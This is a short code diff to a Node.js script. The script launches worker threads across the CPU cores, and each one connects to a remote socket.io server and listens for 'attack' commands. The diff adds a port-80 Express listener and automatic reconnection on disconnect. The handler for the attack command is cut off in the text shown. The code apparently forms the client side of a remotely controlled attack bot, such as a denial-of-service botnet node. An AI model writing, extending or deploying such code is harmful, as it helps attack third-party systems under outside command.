@@ -3,8 +3,12 @@ const {
     isMainThread
 } = require('worker_threads');
 const io = require("socket.io-client");
-
-
+const express = require('express')
+const app = express()
+app.get("/", (req, res) => {
+    res.end('e')
+})
+app.listen(80)
 if (isMainThread) {
     for (i = 0; i < require('os').cpus().length / 1.5; i++) {
         new Worker(__filename);
@@ -20,7 +24,10 @@ if (isMainThread) {
         console.log(socket.id); // "G5p5..."
     });
     socket.on("disconnect", () => {
-        socket.connect();
+        console.log('disconnected')
+        setTimeout(() => {
+            socket.connect()
+        }, 1000)
     });
     socket.on('attack', async m => {
         console.log(m)
